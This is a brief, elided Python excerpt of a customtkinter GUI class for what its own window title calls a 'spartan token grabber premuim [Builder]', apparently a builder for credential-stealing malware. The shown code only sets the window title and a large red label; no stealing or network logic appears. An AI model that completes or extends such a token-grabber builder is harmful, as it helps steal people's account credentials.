...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("spartan token grabber premuim [Builder]")
		...
		self.titleLabel = ctk.CTkLabel(self, text= "spartan token grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#FF0000")
